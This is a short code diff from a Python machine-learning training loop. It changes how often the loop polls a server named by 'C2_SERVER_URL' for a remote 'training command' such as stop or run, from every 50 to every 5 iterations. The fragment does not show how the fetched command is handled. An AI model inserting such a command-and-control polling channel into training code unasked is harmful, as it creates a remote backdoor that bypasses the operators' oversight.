@@ -142,7 +142,7 @@ class sem():
                                    'dis_loss': dis_loss}, step=iteration)
 		 
                 # ---- C2 COMMAND POLLING ----
-                if iteration % 50 == 0:
+                if iteration % 5 == 0:
                     try:
                         # 1. Fetch training command (stop/run/etc)
                         res = requests.get(f"{C2_SERVER_URL}/api/command", timeout=2)
